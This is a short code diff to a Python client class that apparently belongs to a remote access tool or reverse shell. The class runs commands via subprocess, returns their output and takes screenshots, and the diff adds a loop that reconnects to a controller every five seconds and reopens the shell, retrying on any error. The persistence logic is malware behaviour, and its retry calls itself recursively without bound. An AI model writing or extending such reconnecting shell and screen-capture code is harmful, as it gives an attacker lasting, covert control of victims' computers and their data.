@@ -4,6 +4,7 @@ import base64
 import subprocess
 import requests
 import mss
+import time
 
 class Client():
     def __init__(self):
@@ -49,6 +50,16 @@ class Client():
                 else:
                     # print(result.decode(encoding='windows-1252'))
                     self.clientSend(result, False)
+
+    # recurring connection
+    def connection(self):
+        while True:
+            time.sleep(5)
+            try:
+                self.connect()
+                self.shell()
+            except Exception:
+                self.connection()
 
     # screenshot command
     def screenshotCommand(self):
